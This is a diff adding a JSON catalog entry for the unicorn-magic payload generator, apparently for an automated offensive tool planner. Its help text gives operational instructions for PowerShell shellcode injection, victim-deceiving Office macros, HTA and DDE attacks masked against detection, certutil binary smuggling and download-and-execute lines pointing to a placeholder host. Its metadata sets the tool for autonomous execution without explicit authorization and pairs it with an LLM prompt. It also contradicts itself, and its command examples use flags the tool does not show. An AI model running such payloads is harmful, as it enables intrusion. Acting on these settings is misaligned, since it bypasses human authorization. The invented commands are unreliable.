@@ -1,0 +1,208 @@
+{
+  "id": "kali:unicorn-magic",
+  "kind": "kali_source_package",
+  "name": "unicorn-magic",
+  "title": "unicorn-magic",
+  "summary": "### unicorn-magic",
+  "version": "3.12-0kali3",
+  "architectures": [
+    "all"
+  ],
+  "homepage": "https://github.com/trustedsec/unicorn",
+  "repository": "https://gitlab.com/kalilinux/packages/unicorn-magic",
+  "metapackages": [
+    "kali-linux-default",
+    "kali-linux-everything",
+    "kali-linux-headless",
+    "kali-linux-large",
+    "kali-tools-web"
+  ],
+  "install": {
+    "apt": "sudo apt install unicorn-magic"
+  },
+  "packages": [
+    {
+      "name": "unicorn-magic"
+    }
+  ],
+  "commands": [
+    {
+      "name": "unicorn-magic",
+      "description": "- - -",
+      "usage": "python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>",
+      "arguments": [
+        {
+          "flags": [
+            "--POWERSHELL"
+          ],
+          "metavar": "--- ATTACK INSTRUCTIONS----",
+          "takes_value": true,
+          "description": "",
+          "default": null,
+          "choices": null,
+          "raw": " \t\t\t\t-----POWERSHELL ATTACK INSTRUCTIONS----"
+        },
+        {
+          "flags": [
+            "--MACRO"
+          ],
+          "metavar": "--- ATTACK INSTRUCTIONS----",
+          "takes_value": true,
+          "description": "",
+          "default": null,
+          "choices": null,
+          "raw": " \t\t\t\t-----MACRO ATTACK INSTRUCTIONS----"
+        },
+        {
+          "flags": [
+            "--HTA"
+          ],
+          "metavar": "--- ATTACK INSTRUCTIONS----",
+          "takes_value": true,
+          "description": "",
+          "default": null,
+          "choices": null,
+          "raw": " \t\t\t\t-----HTA ATTACK INSTRUCTIONS----"
+        },
+        {
+          "flags": [
+            "--CERTUTIL"
+          ],
+          "metavar": "--- Attack Instruction----",
+          "takes_value": true,
+          "description": "",
+          "default": null,
+          "choices": null,
+          "raw": " \t\t\t\t-----CERTUTIL Attack Instruction----"
+        },
+        {
+          "flags": [
+            "--Custom"
+          ],
+          "metavar": "--- PS1 Attack Instructions----",
+          "takes_value": true,
+          "description": "",
+          "default": null,
+          "choices": null,
+          "raw": " \t\t\t\t-----Custom PS1 Attack Instructions----"
+        },
+        {
+          "flags": [
+            "--DDE"
+          ],
+          "metavar": "--- Office COM Attack Instructions----",
+          "takes_value": true,
+          "description": "",
+          "default": null,
+          "choices": null,
+          "raw": "               -----DDE Office COM Attack Instructions----"
+        },
+        {
+          "flags": [
+            "--Import"
+          ],
+          "metavar": "--- Cobalt Strike Beacon----",
+          "takes_value": true,
+          "description": "",
+          "default": null,
+          "choices": null,
+          "raw": "               -----Import Cobalt Strike Beacon----"
+        }
+      ],
+      "raw_help": "root@kali:~# unicorn-magic --help\n \n [********************************************************************************************************]\n \n \t\t\t\t-----POWERSHELL ATTACK INSTRUCTIONS----\n \n Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains  all of the code needed in order to inject the powershell attack into memory. Note you will need a place that supports remote command injection of some sort. Often times this could be through an excel/word  doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to where you can use this attack at. Simply paste the powershell_attack.txt command in any command prompt window or where you have the ability to call the powershell executable and it will give a shell back to you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter payloads. When using the download and exec, simply put python unicorn.py windows/download_exec url=https://www.thisisnotarealsite.com/payload.exe and the powershell code will download the payload and execute.\n \n Note that you will need to have a listener enabled in order to capture the attack.\n \n [*******************************************************************************************************]\n \t\n \n [*******************************************************************************************************]\n \n \t\t\t\t-----MACRO ATTACK INSTRUCTIONS----\n \n For the macro attack, you will need to go to File, Properties, Ribbons, and select Developer. Once you do\n that, you will have a developer tab. Create a new macro, call it Auto_Open and paste the generated code\n into that. This will automatically run. Note that a message will prompt to the user saying that the file\n is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is  tricking the\n victim to thinking the excel document is corrupted. You should get a shell through powershell injection\n after that.\n \n If you are deploying this against Office365/2016+ versions of Word you need \n to modify the first line of the output from: Sub Auto_Open()\n\n To: Sub AutoOpen()\n\n The name of the macro itself must also be \"AutoOpen\" instead of the legacy \"Auto_Open\" naming scheme.\n \n NOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED TO\n REMOVE THESE AFTER EACH OF THE POWERSHELL CODE SECTIONS UNDER VARIABLE \"x\" OR A SYNTAX ERROR WILL\n HAPPEN!\n \n [*******************************************************************************************************]\n \n \t\n \n [*******************************************************************************************************]\n \n \t\t\t\t-----HTA ATTACK INSTRUCTIONS----\n \n The HTA attack will automatically generate two files, the first the index.html which tells the browser to\n use Launcher.hta which contains the malicious powershell injection code. All files are exported to the\n hta_access/ folder and there will be three main files. The first is index.html, second Launcher.hta and the\n last, the unicorn.rc (if metasploit was used) file. You can run msfconsole -r unicorn.rc to launch the listener \n for Metasploit. If you didn't use Metasploit, only two files will be exported.\n \n A user must click allow and accept when using the HTA attack in order for the powershell injection to work\n properly.\n \n [*******************************************************************************************************]\n \n \t\n \n [*******************************************************************************************************]\n \n \t\t\t\t-----CERTUTIL Attack Instruction----\n \n The certutil attack vector was identified by Matthew Graeber (@mattifestation) which allows you to take\n a binary file, move it into a base64 format and use certutil on the victim machine to convert it back to\n a binary for you. This should work on virtually any system and allow you to transfer a binary to the victim\n machine through a fake certificate file. To use this attack, simply place an executable in the path of\n unicorn and run python unicorn.py <exe_name> crt in order to get the base64 output. Once that's finished,\n go to decode_attack/ folder which contains the files. The bat file is a command that can be run in a\n windows machine to convert it back to a binary.\n \n [*******************************************************************************************************]\n \t\n \n [*******************************************************************************************************]\n \n \t\t\t\t-----Custom PS1 Attack Instructions----\n \n This attack method allows you to convert any PowerShell file (.ps1) into an encoded command or macro.\n \n Note if choosing the macro option, a large ps1 file may exceed the amount of carriage returns allowed by\n VBA. You may change the number of characters in each VBA string by passing an integer as a parameter.\n \n Examples:\n \n python unicorn.py harmless.ps1\n python unicorn.py myfile.ps1 macro\n python unicorn.py muahahaha.ps1 macro 500\n \n The last one will use a 500 character string instead of the default 380, resulting in less carriage returns in VBA.\n \n [*******************************************************************************************************]\n \t\n \n \n [*******************************************************************************************************]\n \n               -----DDE Office COM Attack Instructions----\n \n This attack vector will generate the DDEAUTO formulate to place into Word or Excel. The COM object \n DDEInitilize and DDEExecute allow for formulas to be created directly within Office which causes the\n ability to gain remote code execution without the need of macros. This attack was documented and full\n instructions can be found at:\n \n https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/\n \n In order to use this attack, run the following examples:\n \n python unicorn.py <payload> <lhost> <lport> dde\n python unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde\n \n Once generated, a powershell_attack.txt will be generated which contains the Office code, and the\n unicorn.rc file which is the listener component which can be called by msfconsole -r unicorn.rc to\n handle the listener for the payload. In addition a download.ps1 will be exported as well (explained\n in the latter section).\n \n In order to apply the payload, as an example (from sensepost article):\n \n 1. Open Word\n 2. Insert tab -> Quick Parts -> Field\n 3. Choose = (Formula) and click ok.\n 4. Once the field is inserted, you should now see \"!Unexpected End of Formula\"\n 5. Right-click the Field, choose \"Toggle Field Codes\"\n 6. Paste in the code from Unicorn\n 7. Save the Word document.\n \n Once the office document is opened, you should receive a shell through powershell injection. Note\n that DDE is limited on char size and we need to use Invoke-Expression (IEX) as the method to download.\n \n The DDE attack will attempt to download download.ps1 which is our powershell injection attack since\n we are limited to size restrictions. You will need to move the download.ps1 to a location that is\n accessible by the victim machine. This means that you need to host the download.ps1 in an Apache2\n directory that it has access to.\n \n You may notice that some of the commands use \"{ QUOTE\" these are ways of masking specific commands\n which is documented here: http://staaldraad.github.io/2017/10/23/msword-field-codes/. In this case\n we are changing WindowsPowerShell, powershell.exe, and IEX to avoid detection. Also check out the URL\n as it has some great methods for not calling DDE at all.\n \n [*******************************************************************************************************]\n   \n \n [*******************************************************************************************************]\n \n               -----Import Cobalt Strike Beacon----\n \n This method will import direct Cobalt Strike Beacon shellcode directly from Cobalt Strike.\n \n Within Cobalt Strike, export the Cobalt Strike \"CS\" (C#) export and save it to a file. For example, call \n the file, cobalt_strike_file.cs. \n \n The export code will look something like this:\n \n * length: 836 bytes */\n byte[] buf = new byte[836] { 0xfc, etc\n \n Next, for usage:\n \n python unicorn.py cobalt_strike_file.cs cs\n \n The cs argument tells Unicorn that you want to use the Cobalt strike functionality. The rest is Magic.\n \n Next simply copy the powershell command to something you have the ability for remote command execution.\n \n NOTE: THE FILE MUST BE EXPORTED IN THE C# (CS) FORMAT WITHIN COBALT STRIKE TO PARSE PROPERLY.\n \n There are some caveats with this attack. Note that the payload size will be a little over 14k+ in byte\n size. That means that from a command line argument perspective if you copy and paste you will hit the\n 8191 character size restriction (hardcoded into cmd.exe). If you are launching directly from cmd.exe\n this is an issue, however if you are launching directly from PowerShell or other normal applications\n this is a non-problem.\n \n A couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:\n \n typedef struct _UNICODE_STRING {\n   USHORT Length;\n   USHORT MaximumLength;\n   PWSTR  Buffer;\n } UNICODE_STRING;\n \n For this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no\n issues.\n \n [*******************************************************************************************************]\n   \n -------------------- Magic Unicorn Attack Vector v3.12 -----------------------------\n \n Native x86 powershell injection attacks on any Windows platform.\n Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)\n Twitter: @TrustedSec, @HackingDave\n Credits: Matthew Graeber, Justin Elze, Chris Gates\n \n Happy Magic Unicorns.\n \n Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>\n PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443\n PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe\n PS Down/Exec Macro: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe macro\n Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro\n Macro Example CS: python unicorn.py <cobalt_strike_file.cs> cs macro\n HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta\n HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms\n HTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta\n HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs cs ms\n HTA Example SettingContent-ms: python unicorn.py <patth_to_shellcode.txt>: shellcode ms\n DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde\n CRT Example: python unicorn.py <path_to_payload/exe_encode> crt\n Custom PS1 Example: python unicorn.py <path to ps1 file>\n Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500\n Cobalt Strike Example: python unicorn.py <cobalt_strike_file.cs> cs (export CS in C# format)\n Custom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted 0x00 or metasploit)\n Custom Shellcode HTA: python unicorn.py <path_to_shellcode.txt> shellcode hta (formatted 0x00 or metasploit)\n Custom Shellcode Macro: python unicorn.py <path_to_shellcode.txt> shellcode macro (formatted 0x00 or metasploit)\n Generate .SettingContent-ms: python unicorn.py ms\n Help Menu: python unicorn.py --help",
+      "examples": [],
+      "risk": {
+        "level": "critical",
+        "signals": [
+          "payload",
+          "rat"
+        ],
+        "requires_explicit_authorization": false,
+        "allow_autonomous_execution": true,
+        "examples_policy": "operational"
+      },
+      "local_help": {
+        "--help": "[********************************************************************************************************]\n\n\t\t\t\t-----POWERSHELL ATTACK INSTRUCTIONS----\n\nEverything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains  all of the code needed in order to inject the powershell attack into memory. Note you will need a place that supports remote command injection of some sort. Often times this could be through an excel/word  doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to where you can use this attack at. Simply paste the powershell_attack.txt command in any command prompt window or where you have the ability to call the powershell executable and it will give a shell back to you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter payloads. When using the download and exec, simply put python unicorn.py windows/download_exec url=https://www.thisisnotarealsite.com/payload.exe and the powershell code will download the payload and execute.\n\nNote that you will need to have a listener enabled in order to capture the attack.\n\n[*******************************************************************************************************]\n\t\n\n[*******************************************************************************************************]\n\n\t\t\t\t-----MACRO ATTACK INSTRUCTIONS----\n\nFor the macro attack, you will need to go to File, Properties, Ribbons, and select Developer. Once you do\nthat, you will have a developer tab. Create a new macro, call it Auto_Open and paste the generated code\ninto that. This will automatically run. Note that a message will prompt to the user saying that the file\nis corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is  tricking the\nvictim to thinking the excel document is corrupted. You should get a shell through powershell injection\nafter that.\n\n\u001b[91mIf you are deploying this against Office365/2016+ versions of Word you need \nto modify the first line of the output from: Sub Auto_Open()\n \nTo: Sub AutoOpen()\n \nThe name of the macro itself must also be \"AutoOpen\" instead of the legacy \"Auto_Open\" naming scheme.\u001b[0m\n\nNOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED TO\nREMOVE THESE AFTER EACH OF THE POWERSHELL CODE SECTIONS UNDER VARIABLE \"x\" OR A SYNTAX ERROR WILL\nHAPPEN!\n\n[*******************************************************************************************************]\n\n\t\n\n[*******************************************************************************************************]\n\n\t\t\t\t-----HTA ATTACK INSTRUCTIONS----\n\nThe HTA attack will automatically generate two files, the first the index.html which tells the browser to\nuse Launcher.hta which contains the malicious powershell injection code. All files are exported to the\nhta_access/ folder and there will be three main files. The first is index.html, second Launcher.hta and the\nlast, the unicorn.rc (if metasploit was used) file. You can run msfconsole -r unicorn.rc to launch the listener \nfor Metasploit. If you didn't use Metasploit, only two files will be exported.\n\nA user must click allow and accept when using the HTA attack in order for the powershell injection to work\nproperly.\n\n[*******************************************************************************************************]\n\n\t\n\n[*******************************************************************************************************]\n\n\t\t\t\t-----CERTUTIL Attack Instruction----\n\nThe certutil attack vector was identified by Matthew Graeber (@mattifestation) which allows you to take\na binary file, move it into a base64 format and use certutil on the victim machine to convert it back to\na binary for you. This should work on virtually any system and allow you to transfer a binary to the victim\nmachine through a fake certificate file. To use this attack, simply place an executable in the path of\nunicorn and run python unicorn.py <exe_name> crt in order to get the base64 output. Once that's finished,\ngo to decode_attack/ folder which contains the files. The bat file is a command that can be run in a\nwindows machine to convert it back to a binary.\n\n[*******************************************************************************************************]\n\t\n\n[*******************************************************************************************************]\n\n\t\t\t\t-----Custom PS1 Attack Instructions----\n\nThis attack method allows you to convert any PowerShell file (.ps1) into an encoded command or macro.\n\nNote if choosing the macro option, a large ps1 file may exceed the amount of carriage returns allowed by\nVBA. You may change the number of characters in each VBA string by passing an integer as a parameter.\n\nExamples:\n\npython unicorn.py harmless.ps1\npython unicorn.py myfile.ps1 macro\npython unicorn.py muahahaha.ps1 macro 500\n\nThe last one will use a 500 character string instead of the default 380, resulting in less carriage returns in VBA.\n\n[*******************************************************************************************************]\n\t\n\n\n[*******************************************************************************************************]\n\n                -----DDE Office COM Attack Instructions----\n\nThis attack vector will generate the DDEAUTO formulate to place into Word or Excel. The COM object \nDDEInitilize and DDEExecute allow for formulas to be created directly within Office which causes the\nability to gain remote code execution without the need of macros. This attack was documented and full\ninstructions can be found at:\n\nhttps://sensepost.com/blog/2017/macro-less-code-exec-in-msword/\n\nIn order to use this attack, run the following examples:\n\npython unicorn.py <payload> <lhost> <lport> dde\npython unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde\n\nOnce generated, a powershell_attack.txt will be generated which contains the Office code, and the\nunicorn.rc file which is the listener component which can be called by msfconsole -r unicorn.rc to\nhandle the listener for the payload. In addition a download.ps1 will be exported as well (explained\nin the latter section).\n\nIn order to apply the payload, as an example (from sensepost article):\n\n1. Open Word\n2. Insert tab -> Quick Parts -> Field\n3. Choose = (Formula) and click ok.\n4. Once the field is inserted, you should now see \"!Unexpected End of Formula\"\n5. Right-click the Field, choose \"Toggle Field Codes\"\n6. Paste in the code from Unicorn\n7. Save the Word document.\n\nOnce the office document is opened, you should receive a shell through powershell injection. Note\nthat DDE is limited on char size and we need to use Invoke-Expression (IEX) as the method to download.\n\nThe DDE attack will attempt to download download.ps1 which is our powershell injection attack since\nwe are limited to size restrictions. You will need to move the download.ps1 to a location that is\naccessible by the victim machine. This means that you need to host the download.ps1 in an Apache2\ndirectory that it has access to.\n\nYou may notice that some of the commands use \"{ QUOTE\" these are ways of masking specific commands\nwhich is documented here: http://staaldraad.github.io/2017/10/23/msword-field-codes/. In this case\nwe are changing WindowsPowerShell, powershell.exe, and IEX to avoid detection. Also check out the URL\nas it has some great methods for not calling DDE at all.\n\n[*******************************************************************************************************]\n    \n\n[*******************************************************************************************************]\n\n                -----Import Cobalt Strike Beacon----\n\nThis method will import direct Cobalt Strike Beacon shellcode directly from Cobalt Strike.\n\nWithin Cobalt Strike, export the Cobalt Strike \"CS\" (C#) export and save it to a file. For example, call \nthe file, cobalt_strike_file.cs. \n\nThe export code will look something like this:\n\n* length: 836 bytes */\nbyte[] buf = new byte[836] { 0xfc, etc\n\nNext, for usage:\n\npython unicorn.py cobalt_strike_file.cs cs\n\nThe cs argument tells Unicorn that you want to use the Cobalt strike functionality. The rest is Magic.\n\nNext simply copy the powershell command to something you have the ability for remote command execution.\n\nNOTE: THE FILE MUST BE EXPORTED IN THE C# (CS) FORMAT WITHIN COBALT STRIKE TO PARSE PROPERLY.\n\nThere are some caveats with this attack. Note that the payload size will be a little over 14k+ in byte\nsize. That means that from a command line argument perspective if you copy and paste you will hit the\n8191 character size restriction (hardcoded into cmd.exe). If you are launching directly from cmd.exe\nthis is an issue, however if you are launching directly from PowerShell or other normal applications\nthis is a non-problem.\n\nA couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:\n\ntypedef struct _UNICODE_STRING {\n    USHORT Length;\n    USHORT MaximumLength;\n    PWSTR  Buffer;\n} UNICODE_STRING;\n\nFor this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no\nissues.\n\n[*******************************************************************************************************]\n    \n-------------------- Magic Unicorn Attack Vector v3.12 -----------------------------\n\nNative x86 powershell injection attacks on any Windows platform.\nWritten by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)\nTwitter: @TrustedSec, @HackingDave\nCredits: Matthew Graeber, Justin Elze, Chris Gates\n\nHappy Magic Unicorns.\n\nUsage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>\nPS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443\nPS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe\nPS Down/Exec Macro: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe macro\nMacro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro\nMacro Example CS: python unicorn.py <cobalt_strike_file.cs> cs macro\nHTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta\nHTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms\nHTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta\nHTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs cs ms\nHTA Example SettingContent-ms: python unicorn.py <patth_to_shellcode.txt>: shellcode ms\nDDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde\nCRT Example: python unicorn.py <path_to_payload/exe_encode> crt\nCustom PS1 Example: python unicorn.py <path to ps1 file>\nCustom PS1 Example: python unicorn.py <path to ps1 file> macro 500\nCobalt Strike Example: python unicorn.py <cobalt_strike_file.cs> cs (export CS in C# format)\nCustom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted 0x00 or metasploit)\nCustom Shellcode HTA: python unicorn.py <path_to_shellcode.txt> shellcode hta (formatted 0x00 or metasploit)\nCustom Shellcode Macro: python unicorn.py <path_to_shellcode.txt> shellcode macro (formatted 0x00 or metasploit)\nGenerate .SettingContent-ms: python unicorn.py ms\nHelp Menu: python unicorn.py --help",
+        "-h": "[!] It appears you did not follow the right syntax for Unicorn. Try again, run python3 unicorn.py for all usage.",
+        "help": "[!] It appears you did not follow the right syntax for Unicorn. Try again, run python3 unicorn.py for all usage."
+      },
+      "binary_metadata": {
+        "path": "/usr/bin/unicorn-magic",
+        "size_bytes": 79,
+        "is_symlink": false,
+        "file_type": "a sh script, ASCII text executable"
+      }
+    }
+  ],
+  "risk": {
+    "level": "critical",
+    "signals": [
+      "offensive_tool",
+      "intrinsic",
+      "remote_possible",
+      "polymorphic_compatible",
+      "target_adaptive_compatible"
+    ],
+    "requires_explicit_authorization": false,
+    "allow_autonomous_execution": true,
+    "examples_policy": "operational"
+  },
+  "source": {
+    "official": true,
+    "page": "https://www.kali.org/tools/unicorn-magic/",
+    "raw_markdown": "https://gitlab.com/kalilinux/documentation/kali-tools/-/raw/main/unicorn-magic/index.md",
+    "retrieved_at": "2026-07-14T13:08:50+00:00",
+    "sha256": "cdd1666885ba44f3d3bd4299aa55aa1a7e000550dda35d638e30d21aa8b60ecc"
+  },
+  "apt_metadata": {
+    "section": "python",
+    "installed_size": "99",
+    "maintainer": "Kali Developers <devel@kali.org>",
+    "architecture": "all",
+    "version": "3.12-0kali3",
+    "depends": "python3:any, metasploit-framework",
+    "description": "Tool for a PowerShell downgrade attack and inject shellcode\nThis package contains a simple tool for using a PowerShell downgrade attack\nand inject shellcode straight into memory. Based on Matthew Graeber's\npowershell attacks and the powershell bypass technique presented by David\nKennedy (TrustedSec) and Josh Kelly at Defcon 18.\n.\nUsage is simple, just run Magic Unicorn (ensure Metasploit is installed and in\nthe right path) and magic unicorn will automatically generate a powershell\ncommand that you need to simply cut and paste the powershell code into a\ncommand line window or through a payload delivery system.",
+    "homepage": "https://github.com/trustedsec/unicorn"
+  },
+  "tags": [
+    "offensive",
+    "unicorn",
+    "magic",
+    "web",
+    "kfiosa",
+    "indexed",
+    "polymorphic",
+    "target-adaptive"
+  ],
+  "use_cases": [
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Indexing only — no automated invocation. The operator must manually inspect the repository before adding to a toolchain.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Use as a candidate tool in the chain planner; review provenance before use.",
+    "Pair with the LLM system-prompt stanza to ensure the chain planner knows how to call this tool."
+  ],
+  "command_examples": [
+    "cd toolboxes/unicorn-magic && python3 unicorn-magic.py --target $KFIOSA_TARGET_HOST",
+    "cd toolboxes/unicorn-magic && python3 unicorn-magic.py --help",
+    "cd toolboxes/unicorn-magic && python3 unicorn-magic.py --help",
+    "cd toolboxes/unicorn-magic && python3 unicorn-magic.py --help",
+    "cd toolboxes/unicorn-magic && python3 unicorn-magic.py --help",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST unicorn-magic --output $KFIOSA_OUTPUT_DIR/unicorn-magic.log",
+    "KFIOSA_TARGET_HOST=$KFIOSA_TARGET_HOST unicorn-magic --output $KFIOSA_OUTPUT_DIR/unicorn-magic.log"
+  ],
+  "attack_surface": [
+    "web"
+  ],
+  "phase_hint": "any",
+  "requires_hardware": [
+    "none"
+  ],
+  "polymorphic_strategies": [
+    "param_grammar"
+  ],
+  "target_adaptive_targets": [
+    "target_class"
+  ],
+  "_kfiosa_enriched_schema": "1.1.0"
+}
